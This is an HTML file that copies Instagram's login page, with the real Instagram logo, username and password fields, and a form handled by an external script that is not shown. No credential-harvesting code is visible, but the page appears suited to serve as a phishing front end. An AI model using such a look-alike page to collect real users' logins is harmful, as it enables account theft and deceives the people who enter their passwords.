<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" class="logo">
        <form id="loginForm" class="login-box">
            <input type="text" id="username" placeholder="Phone number, username, or email">
            <input type="password" id="password" placeholder="Password">
            <button type="submit">Log In</button>
            <div class="or-bar">
                <div class="or-line"></div>
                <div class="or-text">OR</div>
                <div class="or-line"></div>
            </div>
            <button class="facebook-login">Log in with Facebook</button>
            <a href="https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25224d10761rcdyi4vma6h7e9d8urr0ky8i4u23ya1l2fde11v3yt2w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D46c98045-e471-45fb-bce8-9faef54a8130%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25224d10761rcdyi4vma6h7e9d8urr0ky8i4u23ya1l2fde11v3yt2w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr">Forgot password?</a>
        </form>
        <div class="additional-info">
            <p>Download the app:</p>
            <div class="app-links">
                <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
                    <img src="appstore.png" alt="App Store" class="store-icon">
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                    <img src="playstore.png" alt="Play Store" class="store-icon">
                </a>
            </div>
        </div>
        <div class="signup-link">
            <span>Don't have an account? </span>
            <a href="#https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
